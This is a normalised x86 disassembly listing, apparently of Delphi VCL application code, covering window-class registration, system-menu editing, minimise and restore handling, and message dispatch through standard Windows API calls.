mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_422fcc
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_42339c
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_45e92c
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c258
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45e38c
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c280
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408584
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_404250
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_45eb08
mov eax ebx
call sub_45f4cc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_45cdc4
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_45cca5
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_40361c
mov ebx edx
mov esi eax
mov eax esi
call sub_45f4dc
mov [ esp + 0x4 ] esi
mov [ esp ] sub_45e194
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_45e38c
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_45ed28
xor edx edx
mov eax esi
call sub_45e6a4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419478
push esi
push sub_45d1f8
mov eax esi
call sub_45df80
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_40564c
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403290
mov eax [ esi + 0x90 ]
call sub_403290
mov eax [ esi + 0x98 ]
call sub_403290
test bl bl
jle r-xdata
call sub_41a554
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_45cdc4
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45cf65
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cf6c
lea eax [ ebp - 0x2c ]
call sub_403fe0
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_45d344
call sub_41a4bc
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_4044a0
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406a98
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403fe0
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_45da48
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45da48
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_45cf74
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_45bca8
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_45cfd4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_413918
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_444968
cmp ebx eax
je r-xdata
sub_45d044
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_45cfd4
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_413a74
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45d15c
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_413a74
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45d1f8
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c520
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_45c1b4
mov eax [ rw-data ]
call sub_45c7fc
sub_45d250
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45d2ad
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d2b4
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_4041d8
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_45d2bc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_45d2f8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45da48
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_45d344
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_45d9fe
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45d1f8
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_45e464
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_413a74
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_444968
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45f390
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45df80
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45df24
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_444968
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45da48
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_45c7fc
push ebp
call sub_45d2bc
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_45d2bc
pop ecx
jmp [ eax * 4 + jump_table_45d3e8 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_444968
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45ddfc
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_449324
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45d250
push ebp
call sub_45d2bc
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_45d2bc
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_45d2bc
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_41928c
jmp r-xdata
xor eax eax
call sub_45517c
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_444968
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_43f334
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45da64
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_45d2bc
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_45a9fc
jmp r-xdata
push ebp
call sub_45d2bc
pop ecx
jmp r-xdata
push ebp
call sub_45d2f8
pop ecx
jmp r-xdata
push ebp
call sub_45d2bc
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45d15c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45db14
jmp r-xdata
jmp r-xdata
call sub_4301bc
call sub_43029c
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45d14c
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45d15c
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45d154
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_45502c
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_45d2bc
pop ecx
jmp r-xdata
call sub_4550e0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_45d2bc
pop ecx
jmp r-xdata
call sub_4301bc
call sub_4302f8
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40cec8
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_45da64
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45d14c
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_45ca7c
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_444968
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_444968
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_45db14
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_45ca7c
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_444968
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_45d15c
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_444968
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_458788
mov eax [ ebx + 0x44 ]
call sub_45aba4
sub_45dc14
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_45dc50
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_404034
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_4040d0
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_45dc9c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_45dcc0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_45dd10
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_43afd8
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_444968
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_45ddc8
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_45ed28
sub_45ddfc
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_444968
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_40348c
test al al
jne r-xdata
sub_45de68
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
